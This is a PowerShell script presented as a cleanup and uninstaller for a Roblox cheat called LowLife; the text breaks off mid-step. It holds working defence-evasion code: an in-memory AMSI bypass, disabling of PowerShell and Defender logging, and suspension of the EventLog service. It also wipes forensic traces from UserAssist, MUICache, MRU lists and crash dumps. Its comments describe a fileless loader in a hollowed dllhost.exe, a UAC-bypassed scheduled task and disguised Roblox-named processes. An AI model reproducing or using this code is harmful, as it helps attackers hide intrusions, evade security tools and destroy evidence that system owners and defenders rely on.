# ==============================================================================
# LowLife Cheat Environment Advanced Cleanup & Performance Uninstaller
# ==============================================================================
# Upgraded with high-resolution stopwatch timing, fast parallelized .NET 
# event log clearing, audit logs, and an interactive telemetry summary.
# Must be executed in an Administrator PowerShell window.
# ==============================================================================
param (
    [switch]$FullUninstall = $false,
    [switch]$NoAuditLog = $false
)

$ErrorActionPreference = "Continue"

$regPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Accessibility'
$storedWorkspace = (Get-ItemProperty -Path $regPath -Name 'Workspace' -ErrorAction SilentlyContinue).Workspace
$storedServerUrl = (Get-ItemProperty -Path $regPath -Name 'ServerUrl' -ErrorAction SilentlyContinue).ServerUrl

# Persistence is tracked via registry key presence (fileless - no .lowlife_persistence file)
$persistEnabled = ((Get-ItemProperty -Path $regPath -Name 'Configuration' -ErrorAction SilentlyContinue).Configuration) -and -not $FullUninstall

# Define script root directory (handles both script execution and copy-paste execution)
$scriptRoot = if ($PSScriptRoot) { $PSScriptRoot } elseif ($PWD -and $PWD.Path) { $PWD.Path } else { (Get-Location).Path }
if ($scriptRoot) { $scriptRoot = (Get-Item $scriptRoot).FullName }

# Verify Administrator privileges
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "==========================================================" -ForegroundColor Red
    Write-Host "       ERROR: THIS SCRIPT MUST BE RUN AS ADMINISTRATOR!     " -ForegroundColor Red
    Write-Host "==========================================================" -ForegroundColor Red
    Write-Host "To successfully delete high-privilege scheduled tasks and files,"
    Write-Host "please execute this script in an elevated PowerShell window:"
    Write-Host ""
    Write-Host "  1. Right-click the Windows Start menu -> select 'PowerShell (Admin)'" -ForegroundColor White
    Write-Host "  2. Navigate to your project folder:" -ForegroundColor White
    Write-Host "     cd '$scriptRoot'" -ForegroundColor Cyan
    Write-Host "  3. Run the cleanup script:" -ForegroundColor White
    Write-Host "     Set-ExecutionPolicy Bypass -Scope Process; .\cleanup.ps1" -ForegroundColor Cyan
    Write-Host "==========================================================" -ForegroundColor Red
    Exit
}

Write-Host "==========================================================" -ForegroundColor Cyan
Write-Host "       LOWLIFE SYSTEM CLEANER & ENVIRONMENT UNINSTALLER       " -ForegroundColor Cyan
Write-Host "==========================================================" -ForegroundColor Cyan

# ==============================================================================
# Stealth In-Memory PowerShell Logging & Security Bypass
# ==============================================================================
try {
    # 1. Disable ScriptBlock, Module, and Transcription logging in memory for this session
    $utils = [Ref].Assembly.GetType('System.Management.Automation.Utils')
    if ($utils) {
        $gpoSettings = $utils.GetField('cachedGroupPolicySettings', 'NonPublic,Static')
        if ($gpoSettings) {
            $gpo = $gpoSettings.GetValue($null)
            if (-not $gpo) {
                $gpo = New-Object 'System.Collections.Generic.Dictionary[string,System.Object]'
                $gpoSettings.SetValue($null, $gpo)
            }
            if ($gpo) {
                $logKeys = @("ScriptBlockLogging", "TranscriptionLogging", "ModuleLogging")
                foreach ($lk in $logKeys) {
                    if (-not $gpo[$lk]) {
                        $gpo[$lk] = New-Object 'System.Collections.Generic.Dictionary[string,System.Object]'
                    }
                }
                $gpo["ScriptBlockLogging"]["EnableScriptBlockLogging"] = 0
                $gpo["ScriptBlockLogging"]["EnableScriptBlockInvocationLogging"] = 0
                $gpo["TranscriptionLogging"]["EnableTranscription"] = 0
                $gpo["ModuleLogging"]["EnableModuleLogging"] = 0
            }
        }
    }
    # 2. Bypass AMSI in memory for this process (preventing security signature scanning logging)
    $amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    if ($amsi) {
        $amsi.GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)
    }
} catch {}

# ==============================================================================
# Stealth Service Controllers & Win32 APIs
# ==============================================================================
$apiSource = @"
using System;
using System.Runtime.InteropServices;

public class ProcessHelper {
    [DllImport("ntdll.dll")]
    public static extern int NtSuspendProcess(IntPtr processHandle);

    [DllImport("ntdll.dll")]
    public static extern int NtResumeProcess(IntPtr processHandle);
}
"@
try {
    Add-Type -TypeDefinition $apiSource -ErrorAction SilentlyContinue
} catch {}

function Suspend-EventLogService {
    try {
        $service = Get-WmiObject Win32_Service | Where-Object { $_.Name -eq 'eventlog' }
        if ($service -and $service.ProcessId -gt 0) {
            $proc = Get-Process -Id $service.ProcessId -ErrorAction SilentlyContinue
            if ($proc) {
                $res = [ProcessHelper]::NtSuspendProcess($proc.Handle)
                if ($res -eq 0) {
                    return $service.ProcessId
                }
            }
        }
    } catch {}
    return $null
}

function Resume-EventLogService {
    param([int]$ProcessId)
    if ($ProcessId -gt 0) {
        try {
            $proc = Get-Process -Id $ProcessId -ErrorAction SilentlyContinue
            if ($proc) {
                [void][ProcessHelper]::NtResumeProcess($proc.Handle)
            }
        } catch {}
    }
}

# Stats tracker
$perfStats = [System.Collections.Generic.List[PSCustomObject]]::new()
$totalCleanedFiles = 0
$totalCleanedKeys = 0
$totalCleanedLogs = 0
$totalDurationMs = 0

# Helper to get all user profiles (excluding Public, Default, and system accounts)
function Get-UserProfilePaths {
    Get-ChildItem -Path "C:\Users" -Directory -ErrorAction SilentlyContinue | 
        Where-Object { $_.Name -notmatch '(?i)^(Public|Default|All Users|Default User)$' } |
        ForEach-Object { $_.FullName }
}

# Helper function to remove all Alternate Data Streams (ADS) from a file before deletion
function Clear-FileAlternateDataStreams {
    param (
        [string]$FilePath
    )
    if (Test-Path $FilePath) {
        try {
            $streams = Get-Item -Path $FilePath -Stream * -ErrorAction SilentlyContinue
            foreach ($s in $streams) {
                if ($s.Stream -and $s.Stream -ne ':$DATA') {
                    Remove-Item -Path $FilePath -Stream $s.Stream -Force -ErrorAction SilentlyContinue
                }
            }
        } catch {}
    }
}

# Helper function to rename a file to a random name before deletion (MFT bypass)
function Safe-DeleteFile {
    param (
        [string]$FilePath
    )
    if (Test-Path $FilePath) {
        try {
            Clear-FileAlternateDataStreams -FilePath $FilePath
            $parent = Split-Path -Parent $FilePath
            $randName = [System.IO.Path]::GetRandomFileName()
            $tempPath = Join-Path $parent $randName
            Rename-Item -Path $FilePath -NewName $randName -Force -ErrorAction SilentlyContinue
            if (Test-Path $tempPath) {
                Remove-Item -Path $tempPath -Force -ErrorAction SilentlyContinue
            } else {
                Remove-Item -Path $FilePath -Force -ErrorAction SilentlyContinue
            }
        } catch {
            Remove-Item -Path $FilePath -Force -ErrorAction SilentlyContinue
        }
    }
}

# Helper function to recursively rename and delete folders (MFT bypass)
function Safe-DeleteFolder {
    param (
        [string]$FolderPath
    )
    if (Test-Path $FolderPath) {
        try {
            # Safely delete all files inside first
            $files = Get-ChildItem -Path $FolderPath -Recurse -File -ErrorAction SilentlyContinue
            foreach ($f in $files) {
                Safe-DeleteFile -FilePath $f.FullName
            }
            
            # Safely delete subfolders
            $subdirs = Get-ChildItem -Path $FolderPath -Recurse -Directory -ErrorAction SilentlyContinue | Sort-Object FullName -Descending
            foreach ($d in $subdirs) {
                if (Test-Path $d.FullName) {
                    $dParent = Split-Path -Parent $d.FullName
                    $dRand = [System.IO.Path]::GetRandomFileName()
                    Rename-Item -Path $d.FullName -NewName $dRand -Force -ErrorAction SilentlyContinue
                    $dTemp = Join-Path $dParent $dRand
                    if (Test-Path $dTemp) {
                        Remove-Item -Path $dTemp -Recurse -Force -ErrorAction SilentlyContinue
                    }
                }
            }
            
            $parent = Split-Path -Parent $FolderPath
            $randName = [System.IO.Path]::GetRandomFileName()
            $tempPath = Join-Path $parent $randName
            Rename-Item -Path $FolderPath -NewName $randName -Force -ErrorAction SilentlyContinue
            if (Test-Path $tempPath) {
                Remove-Item -Path $tempPath -Recurse -Force -ErrorAction SilentlyContinue
            } else {
                Remove-Item -Path $FolderPath -Recurse -Force -ErrorAction SilentlyContinue
            }
        } catch {
            Remove-Item -Path $FolderPath -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

# Helper function to get ROT13 translation of a string
function Get-Rot13 {
    param (
        [string]$InputString
    )
    if (-not $InputString) { return "" }
    $chars = $InputString.ToCharArray()
    $rot = foreach ($c in $chars) {
        if ($c -ge 'a' -and $c -le 'z') {
            [char]((([int]$c - [int][char]'a' + 13) % 26) + [int][char]'a')
        } elseif ($c -ge 'A' -and $c -le 'Z') {
            [char]((([int]$c - [int][char]'A' + 13) % 26) + [int][char]'A')
        } else {
            $c
        }
    }
    return $rot -join ''
}

# Helper function to clean specific registry hives (loaded or offline)
function Clean-RegistryHive {
    param (
        [string]$BasePath,
        [ref]$CleanedKeysCount
    )

    # 1. Target Accessibility configuration propert(ies)
    $accessPath = Join-Path $BasePath "Software\Microsoft\Windows\CurrentVersion\Accessibility"
    if (Test-Path $accessPath) {
        $props = @('Configuration', 'ServerUrl', 'Workspace', 'Persistence')
        foreach ($prop in $props) {
            if ((Get-ItemProperty -Path $accessPath -Name $prop -ErrorAction SilentlyContinue).$prop) {
                Remove-ItemProperty -Path $accessPath -Name $prop -Force -ErrorAction SilentlyContinue
                $CleanedKeysCount.Value++
            }
        }
        $configsSubKey = Join-Path $accessPath "Configs"
        if (Test-Path $configsSubKey) {
            Remove-Item -Path $configsSubKey -Recurse -Force -ErrorAction SilentlyContinue
            $CleanedKeysCount.Value++
        }
    }

    # 2. Target Software\LOWLIFE key
    $lowlifeKey = Join-Path $BasePath "Software\LOWLIFE"
    if (Test-Path $lowlifeKey) {
        Remove-Item -Path $lowlifeKey -Recurse -Force -ErrorAction SilentlyContinue
        $CleanedKeysCount.Value++
    }
    
    # Also clean up dynamically created Software keys matching the pattern in this hive
    $softwareBase = Join-Path $BasePath "Software"
    if (Test-Path $softwareBase) {
        $matchedKeys = Get-ChildItem -Path $softwareBase -ErrorAction SilentlyContinue |
            Where-Object { $_.Name -like "*AM_DELTA_PATCH*" -or $_.Name -like "*B332FDC6*" }
        foreach ($mk in $matchedKeys) {
            Remove-Item -Path $mk.PsPath -Recurse -Force -ErrorAction SilentlyContinue
            $CleanedKeysCount.Value++
        }
    }

    # 3. MUICache references (Search under multiple classes paths)
    $muiCachePaths = @(
        Join-Path $BasePath "Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache",
        Join-Path $BasePath "Local Settings\Software\Microsoft\Windows\Shell\MuiCache"
    )
    foreach ($mPath in $muiCachePaths) {
        if (Test-Path $mPath) {
            $muiCache = Get-Item -Path $mPath -ErrorAction SilentlyContinue
            if ($muiCache) {
                $valueNames = $muiCache.GetValueNames()
                foreach ($val in $valueNames) {
                    if ($val -like "*RobloxPlayerBeta*" -or $val -like "*RobloxCrashHandler*" -or $val -like "*LOWLIFE*" -or $val -like "*delta*" -or $val -like "*B332FDC6*" -or $val -like "*setup*" -or $val -like "*installer*" -or $val -like "*cleanup*") {
                        $muiCache.DeleteValue($val)
                        $CleanedKeysCount.Value++
                    }
                }
            }
        }
    }

    # 4. UserAssist entries
    $userAssistPath = Join-Path $BasePath "Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist"
    if (Test-Path $userAssistPath) {
        # Dynamically build ROT13 keywords
        $plainKeywords = @("lowlife", "RobloxPlayerBeta", "RobloxCrashHandler", "delta", "B332FDC6", "setup", "installer", "cleanup")
        if ($scriptRoot) { $plainKeywords += $scriptRoot }
        if ($storedWorkspace) { $plainKeywords += $storedWorkspace }
        
        $rotKeywords = [System.Collections.Generic.List[string]]::new()
        foreach ($pk in $plainKeywords) {
            $rot = Get-Rot13 -InputString $pk
            if ($rot) {
                $rotKeywords.Add($rot)
            }
        }

        $subKeys = Get-ChildItem -Path $userAssistPath -ErrorAction SilentlyContinue
        foreach ($subKey in $subKeys) {
            $countPath = Join-Path $subKey.PsPath "Count"
            if (Test-Path $countPath) {
                $countKey = Get-Item -Path $countPath -ErrorAction SilentlyContinue
                if ($countKey) {
                    $values = $countKey.GetValueNames()
                    foreach ($val in $values) {
                        $match = $false
                        foreach ($rk in $rotKeywords) {
                            if ($val -like "*$rk*") {
                                $match = $true
                                break
                            }
                        }
                        # Also check the original typo'd key just in case
                        if (-not $match -and ($val -like "*O332SDQ6*")) {
                            $match = $true
                        }
                        if ($match) {
                            $countKey.DeleteValue($val)
                            $CleanedKeysCount.Value++
                        }
                    }
                }
            }
        }
    }

    # 5. AppCompatFlags Compatibility Store
    $compatPath = Join-Path $BasePath "Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store"
    if (Test-Path $compatPath) {
        $key = Get-Item -Path $compatPath -ErrorAction SilentlyContinue
        if ($key) {
            $valueNames = $key.GetValueNames()
            foreach ($val in $valueNames) {
                if ($val -like "*RobloxPlayerBeta*" -or $val -like "*LOWLIFE*" -or $val -like "*delta*" -or $val -like "*B332FDC6*" -or $val -like "*setup*" -or $val -like "*installer*" -or $val -like "*cleanup*") {
                    Remove-ItemProperty -Path $compatPath -Name $val -Force -ErrorAction SilentlyContinue
                    $CleanedKeysCount.Value++
                }
            }
        }
    }

    # 6. ComDlg32 OpenSavePidlMRU, LastVisitedPidlMRU, and RecentDocs
    $comDlgPaths = @(
        Join-Path $BasePath "Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU",
        Join-Path $BasePath "Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedPidlMRU",
        Join-Path $BasePath "Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs"
    )
    foreach ($path in $comDlgPaths) {
        if (Test-Path $path) {
            $subkeys = Get-ChildItem -Path $path -Recurse -ErrorAction SilentlyContinue
            $allKeys = @($path) + ($subkeys | ForEach-Object { $_.PsPath })
            foreach ($k in $allKeys) {
                $keyObj = Get-Item -Path $k -ErrorAction SilentlyContinue
                if ($keyObj) {
                    $values = $keyObj.GetValueNames()
                    foreach ($val in $values) {
                        if ($val -ne "MRUList") {
                            try {
                                $data = $keyObj.GetValue($val)
                                $dataStr = ""
                                if ($data -is [System.Array]) {
                                    $dataStr = [System.Text.Encoding]::Unicode.GetString($data) + [System.Text.Encoding]::ASCII.GetString($data)
                                } else {
                                    $dataStr = $data.ToString()
                                }
                                if ($dataStr -like "*lowlife*" -or $dataStr -like "*RobloxPlayerBeta*" -or $dataStr -like "*delta*" -or $dataStr -like "*B332FDC6*" -or $dataStr -like "*setup*" -or $dataStr -like "*installer*" -or $dataStr -like "*cleanup*") {
                                    Remove-ItemProperty -Path $k -Name $val -Force -ErrorAction SilentlyContinue
                                    $CleanedKeysCount.Value++
                                }
                            } catch {}
                        }
                    }
                }
            }
        }
    }

    # 7. RunMRU
    $runMruPath = Join-Path $BasePath "Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
    if (Test-Path $runMruPath) {
        $runMru = Get-Item -Path $runMruPath -ErrorAction SilentlyContinue
        if ($runMru) {
            $valueNames = $runMru.GetValueNames()
            foreach ($val in $valueNames) {
                if ($val -ne "MRUList") {
                    $data = $runMru.GetValue($val)
                    if ($data -and ($data.ToString() -like "*lowlife*" -or $data.ToString() -like "*RobloxPlayerBeta*" -or $data.ToString() -like "*setup*" -or $data.ToString() -like "*installer*" -or $data.ToString() -like "*cleanup*")) {
                        Remove-ItemProperty -Path $runMruPath -Name $val -Force -ErrorAction SilentlyContinue
                        $CleanedKeysCount.Value++
                    }
                }
            }
        }
    }

    # 8. TypedPaths
    $typedPathsBase = Join-Path $BasePath "Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths"
    if (Test-Path $typedPathsBase) {
        $tpKey = Get-Item -Path $typedPathsBase -ErrorAction SilentlyContinue
        if ($tpKey) {
            $values = $tpKey.GetValueNames()
            foreach ($val in $values) {
                $data = $tpKey.GetValue($val)
                if ($data -and ($data.ToString() -like "*lowlife*" -or $data.ToString() -like "*RobloxPlayerBeta*" -or $data.ToString() -like "*setup*" -or $data.ToString() -like "*installer*" -or $data.ToString() -like "*cleanup*")) {
                    Remove-ItemProperty -Path $typedPathsBase -Name $val -Force -ErrorAction SilentlyContinue
                    $CleanedKeysCount.Value++
                }
            }
        }
    }

    # 9. WordWheelQuery
    $wordWheelPath = Join-Path $BasePath "Software\Microsoft\Windows\CurrentVersion\Explorer\WordWheelQuery"
    if (Test-Path $wordWheelPath) {
        $wwKey = Get-Item -Path $wordWheelPath -ErrorAction SilentlyContinue
        if ($wwKey) {
            $values = $wwKey.GetValueNames()
            foreach ($val in $values) {
                if ($val -ne "MRUListEx") {
                    $data = $wwKey.GetValue($val)
                    $dataStr = ""
                    if ($data -is [System.Array]) {
                        $dataStr = [System.Text.Encoding]::Unicode.GetString($data) + [System.Text.Encoding]::ASCII.GetString($data)
                    } else {
                        $dataStr = $data.ToString()
                    }
                    if ($dataStr -like "*lowlife*" -or $dataStr -like "*RobloxPlayerBeta*" -or $dataStr -like "*setup*" -or $dataStr -like "*installer*" -or $dataStr -like "*cleanup*") {
                        Remove-ItemProperty -Path $wordWheelPath -Name $val -Force -ErrorAction SilentlyContinue
                        $CleanedKeysCount.Value++
                    }
                }
            }
        }
    }

    # 11. Run key LowLifePortal
    $runKeyPath = Join-Path $BasePath "Software\Microsoft\Windows\CurrentVersion\Run"
    if (Test-Path $runKeyPath) {
        $runKey = Get-Item -Path $runKeyPath -ErrorAction SilentlyContinue
        if ($runKey -and $runKey.GetValue("LowLifePortal")) {
            Remove-ItemProperty -Path $runKeyPath -Name "LowLifePortal" -Force -ErrorAction SilentlyContinue | Out-Null
            $CleanedKeysCount.Value++
        }
    }
}

# Helper function to track performance of a step
function Run-CleanupStep {
    param (
        [string]$StepName,
        [scriptblock]$Action
    )

    Write-Host "[*] $StepName..." -ForegroundColor Yellow
    $sw = [System.Diagnostics.Stopwatch]::StartNew()
    $status = "SUCCESS"
    $details = ""

    try {
        $result = & $Action
        $sw.Stop()
        if ($result -ne $null) {
            $details = $result
        }
    } catch {
        $sw.Stop()
        $status = "WARNING"
        $details = $_.Exception.Message
        Write-Host "    [!] Warning: $_" -ForegroundColor Red
    }

    $elapsed = [Math]::Round($sw.Elapsed.TotalMilliseconds, 2)
    $script:totalDurationMs += $elapsed

    $perfStats.Add([PSCustomObject]@{
        "Step"     = $StepName
        "Duration" = "$elapsed ms"
        "Status"   = $status
        "Details"  = $details
    })

    if ($status -eq "SUCCESS") {
        Write-Host "    [+] Completed in $elapsed ms" -ForegroundColor Green
    } else {
        Write-Host "    [-] Completed with warnings in $elapsed ms" -ForegroundColor DarkYellow
    }
    Write-Host ""
}

# Temporarily disable event logging channels during cleanup to maintain stealth
$tempDisabledChannels = @(
    "Microsoft-Windows-PowerShell/Operational",
    "Windows PowerShell",
    "PowerShellCore/Operational",
    "Microsoft-Windows-TaskScheduler/Operational",
    "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational",
    "Microsoft-Windows-Windows Defender/Operational",
    "Microsoft-Windows-Windows Defender/WHC",
    "Microsoft-Windows-Application-Experience/Program-Telemetry",
    "Microsoft-Windows-Application-Experience/Program-Inventory",
    "Microsoft-Windows-Application-Experience/Program-Compatibility-Assistant",
    "Microsoft-Windows-WMI-Activity/Operational"
)
foreach ($chan in $tempDisabledChannels) {
    try { wevtutil.exe sl $chan /e:false 2>$null } catch {}
}

# Now suspend the EventLog service to prevent logging of cleanup actions
$suspendedLogPid = Suspend-EventLogService

try {
    # 1. Terminate running processes
    Run-CleanupStep "1/9: Terminating loader and server processes" {
        $count = 0
    # Fileless loader runs inside a hollowed dllhost.exe on port 9876.
    # Identify it by finding the process owning port 9876.
    $conn = Get-NetTCPConnection -LocalPort 9876 -State Listen -ErrorAction SilentlyContinue
    if ($conn) {
        foreach ($c in $conn) {
            Stop-Process -Id $c.OwningProcess -Force -ErrorAction SilentlyContinue
            $count++
        }
    }
    # Clean up updates server running on port 3000
    $serverConn = Get-NetTCPConnection -LocalPort 3000 -State Listen -ErrorAction SilentlyContinue
    if ($serverConn) {
        foreach ($sc in $serverConn) {
            Stop-Process -Id $sc.OwningProcess -Force -ErrorAction SilentlyContinue
            $count++
        }
    }
    # Also kill any legacy file-based, fallback or runner processes if still present
    $targetProcNames = @(
        "RobloxPlayerBeta", "RobloxPlayerBeta_fallback", "RobloxPlayerBetaBootstrapper",
        "RobloxCrashHandler", "RobloxCrashHandler_fallback", "RobloxCrashHandlerBootstrapper",
        "LOWLIFE", "LOWLIFEHost", "LOWLIFELoader", "loader", "host", "injector"
    )
    $legacy = Get-Process -Name $targetProcNames -ErrorAction SilentlyContinue
    # Wildcard matches for dynamically generated names
    $dynamicLegacy = Get-Process -ErrorAction SilentlyContinue | Where-Object {
        $_.Name -like "*AM_DELTA_PATCH*" -or $_.Name -like "*B332FDC6*"
    }
    $allLegacy = @()
    if ($legacy) { $allLegacy += $legacy }
    if ($dynamicLegacy) { $allLegacy += $dynamicLegacy }
    if ($allLegacy.Count -gt 0) {
        foreach ($p in $allLegacy) {
            Stop-Process -Id $p.Id -Force -ErrorAction SilentlyContinue
            $count++
        }
    }
    return "Terminated $count process(es)"
}

# 2. End and delete the UAC-bypassed Scheduled Task, firewall rules, and BITS jobs
Run-CleanupStep "2/9: Removing Scheduled Tasks, Firewall Rules, and BITS Jobs" {
    $details = ""
    
    # 2a. Scheduled Tasks
    $tasks = Get-ScheduledTask -ErrorAction SilentlyContinue | Where-Object { 
        $_.TaskName -eq "RobloxPlayerBeta" -or 
        $_.TaskName -eq "RobloxPlayerBetaBootstrapper" -or 
        $_.TaskName -eq "RobloxCrashHandler" -or 
        $_.TaskName -eq "RobloxCrashHandlerBootstrapper" -or 
        $_.TaskName -eq "DebugLoaderTask" -or
        $_.TaskName -like "*AM_DELTA_PATCH*" -or 
        $_.TaskName -like "*B332FDC6*"
    }
    $taskCount = 0
    if ($tasks) {
        foreach ($task in $tasks) {
            if ($task.State -eq 'Running') {
                Stop-ScheduledTask -TaskName $task.TaskName -ErrorAction SilentlyContinue
            }
            Unregister-ScheduledTask -TaskName $task.TaskName -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
            $taskCount++
        }
        $details += "Removed $taskCount task(s)"
    }
    
    # 2b. Firewall Rules
    $firewallRules = Get-NetFirewallRule -ErrorAction SilentlyContinue | Where-Object {
        $_.DisplayName -like "*RobloxPlayerBeta*" -or $_.Name -like "*RobloxPlayerBeta*"
    }
    $fwCount = 0
    if ($firewallRules) {
        foreach ($rule in $firewallRules) {
            Remove-NetFirewallRule -Name $rule.Name -ErrorAction SilentlyContinue
            $fwCount++
        }
    }
    if ($fwCount -gt 0) {
        if ($details) { $details += "; " }
        $details += "Removed $fwCount firewall rule(s)"
    }
    
    # 2c. BITS Jobs
    $bitsCount = 0
    try {
        Import-Module BitsTransfer -ErrorAction SilentlyContinue
        $bitsJobs = Get-BitsTransfer -AllUsers -ErrorAction SilentlyContinue | Where-Object {
            $_.DisplayName -like "*RobloxPlayerBeta*" -or $_.JobId.ToString() -like "*RobloxPlayerBeta*"
        }
        if ($bitsJobs) {
            foreach ($job in $bitsJobs) {
                Remove-BitsTransfer -BitsJob $job -ErrorAction SilentlyContinue
                $bitsCount++
            }
        }
    } catch {}
    if ($bitsCount -gt 0) {
        if ($details) { $details += "; " }
        $details += "Removed $bitsCount BITS job(s)"
    }
    
    if ($details) { return $details }
    return "No matching tasks, firewall rules, or BITS jobs found"
}

# 3. Clean up any legacy installed binary folder (fileless installs don't create this)
Run-CleanupStep "3/9: Checking for legacy binary folders (LocalAppData)" {
    $filesWiped = 0
    $targets = [System.Collections.Generic.List[string]]::new()
    $legacyFolder2 = "$env:LOCALAPPDATA\RobloxPlayerBeta"
    if (Test-Path $legacyFolder2) { $targets.Add($legacyFolder2) }
    $legacyFolder3 = "$env:LOCALAPPDATA\RobloxCrashHandler"
    if (Test-Path $legacyFolder3) { $targets.Add($legacyFolder3) }
    $dynamicFolders = Get-ChildItem -Path $env:LOCALAPPDATA -Directory -ErrorAction SilentlyContinue |
        Where-Object { $_.Name -like "*AM_DELTA_PATCH*" -or $_.Name -like "*B332FDC6*" }
    foreach ($df in $dynamicFolders) { $targets.Add($df.FullName) }
    foreach ($target in $targets) {
        $files = Get-ChildItem -Path $target -Recurse -File -ErrorAction SilentlyContinue
        if ($files) { $filesWiped += $files.Count }
        Safe-DeleteFolder -FolderPath $target
    }
    $script:totalCleanedFiles += $filesWiped
    if ($targets.Count -gt 0) { return "Wiped $($targets.Count) legacy folder(s), $filesWiped file(s)" }
    return "No legacy LocalAppData folders found (fileless install - expected)"
}

# 4. Clean up legacy AppData folder (fileless installs don't create this)
Run-CleanupStep "4/9: Checking for legacy configuration folder (Roaming AppData)" {
    $appdataFolder = "$env:APPDATA\LOWLIFE"
    $filesWiped = 0
    if (Test-Path $appdataFolder) {
        $files = Get-ChildItem -Path $appdataFolder -Recurse -File -ErrorAction SilentlyContinue
        if ($files) { $filesWiped = $files.Count }
        Safe-DeleteFolder -FolderPath $appdataFolder
        $script:totalCleanedFiles += $filesWiped
        return "Wiped legacy LOWLIFE folder, deleted $filesWiped file(s)"
    }
    return "No legacy AppData\LOWLIFE folder found (fileless install - expected)"
}

# 5. Clean up temporary directory remnants, WER crash reports/dumps, DNS cache, and WinINet web cache
Run-CleanupStep "5/9: Cleaning temporary residues, WER crash reports, DNS cache, and WinINet web cache" {
    $tempDir = [System.IO.Path]::GetTempPath()
    $hostFiles = @("LOWLIFEHost.exe", "LOWLIFELoader.exe", "loader.exe", "host.exe", "injector.exe", "LOWLIFE.exe", "cleaner.bat")
    $cleanedCount = 0
    foreach ($file in $hostFiles) {
        $targetPath = Join-Path $tempDir $file
        if (Test-Path $targetPath) {
            Safe-DeleteFile -FilePath $targetPath
            $cleanedCount++
        }
    }
    
    $patternFiles = Get-ChildItem -Path $tempDir -File -ErrorAction SilentlyContinue |
        Where-Object { $_.Name -like "*AM_DELTA_PATCH*" -or $_.Name -like "*B332FDC6*" }
    foreach ($pf in $patternFiles) {
        Safe-DeleteFile -FilePath $pf.FullName
        $cleanedCount++
    }

    # Delete any legacy performance/cleanup logs from Temp directory
    $oldPerfLog = Join-Path $tempDir "lowlife_cleanup_perf.log"
    if (Test-Path $oldPerfLog) {
        Safe-DeleteFile -FilePath $oldPerfLog
        $cleanedCount++
    }
    
    # 5b. Windows Error Reporting (WER) Crash Reports and Mini-dumps (System-wide and Multi-user)
    $werPaths = @(
        "$env:ProgramData\Microsoft\Windows\WER\ReportArchive",
        "$env:ProgramData\Microsoft\Windows\WER\ReportQueue"
    )
    
    # Add CrashDumps and WER paths for all user profiles
    $profiles = Get-UserProfilePaths
    foreach ($pPath in $profiles) {
        $werPaths += Join-Path $pPath "AppData\Local\CrashDumps"
        $werPaths += Join-Path $pPath "AppData\Local\Microsoft\Windows\WER\ReportArchive"
        $werPaths += Join-Path $pPath "AppData\Local\Microsoft\Windows\WER\ReportQueue"
    }

    $werWiped = 0
    foreach ($path in $werPaths) {
        if (Test-Path $path) {
            $matched = Get-ChildItem -Path $path -Recurse -File -ErrorAction SilentlyContinue | Where-Object {
                $_.Name -like "*RobloxPlayerBeta*" -or $_.FullName -like "*RobloxPlayerBeta*" -or
                $_.Name -like "*LOWLIFE*" -or $_.FullName -like "*LOWLIFE*"
            }
            foreach ($file in $matched) {
                Safe-DeleteFile -FilePath $file.FullName
                $werWiped++
                $cleanedCount++
            }
        }
    }
    
    # 5c. WinINet WebClient Cache / IE Temporary Files (Targeted matching only)
    foreach ($pPath in $profiles) {
        $inetCache = Join-Path $pPath "AppData\Local\Microsoft\Windows\INetCache"
        if (Test-Path $inetCache) {
            $inetFiles = Get-ChildItem -Path $inetCache -Recurse -File -ErrorAction SilentlyContinue | Where-Object {
                $_.Name -like "*RobloxPlayerBeta*" -or $_.FullName -like "*RobloxPlayerBeta*" -or
                $_.Name -like "*LOWLIFE*" -or $_.FullName -like "*LOWLIFE*"
            }
            if ($inetFiles) {
                foreach ($f in $inetFiles) {
                    Safe-DeleteFile -FilePath $f.FullName
                    $cleanedCount++
                }
            }
        }
    }
    
    $script:totalCleanedFiles += $cleanedCount
    $details = "Removed $cleanedCount temporary file residue(s)"
    if ($werWiped -gt 0) {
        $details += " (including $werWiped WER crash report/dump files)"
    }
    return $details
}

# 6. Remove license key, Defender exclusions, PSReadLine history, and legacy files
Run-CleanupStep "6/9: Removing license key, Defender exclusions, PSReadLine history, and legacy file remnants" {
    $cleaned = ""
    # Remove registry key used by fileless installer
    $regPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Accessibility'
    $targetProperties = @('Configuration', 'ServerUrl', 'Workspace', 'Persistence')
    $regWiped = 0
    foreach ($prop in $targetProperties) {
        $existing = (Get-ItemProperty -Path $regPath -Name $prop -ErrorAction SilentlyContinue).$prop
        if ($existing) {
            Remove-ItemProperty -Path $regPath -Name $prop -Force -ErrorAction SilentlyContinue
            $regWiped++
            $script:totalCleanedKeys++
        }
    }
    $configsPath = Join-Path $regPath "Configs"
    if (Test-Path $configsPath) {
        Remove-Item -Path $configsPath -Recurse -Force -ErrorAction SilentlyContinue
        $script:totalCleanedKeys++
        $regWiped++
    }
    if ($regWiped -gt 0) {
        $cleaned = "Removed configuration propert(ies) and subkey(s) from registry path: Accessibility"
    }

    # Clean up legacy file-based key artifacts if present from old installs
    $legacyFiles = [System.Collections.Generic.List[string]]::new()
    $legacyFiles.Add("$env:USERPROFILE\.lowlife_key")
    $legacyFiles.Add("$env:USERPROFILE\.lowlife_persistence")
    $legacyFiles.Add("$env:USERPROFILE\.lowlife_bootstrap.ps1")
    $legacyFiles.Add((Join-Path $scriptRoot 'silent_loader.vbs'))
    if ($storedWorkspace) {
        $legacyFiles.Add((Join-Path $storedWorkspace 'silent_loader.vbs'))
    }
    
    $resolvedPath = if ($storedWorkspace) { $storedWorkspace } else { $scriptRoot }
    if ($FullUninstall) {
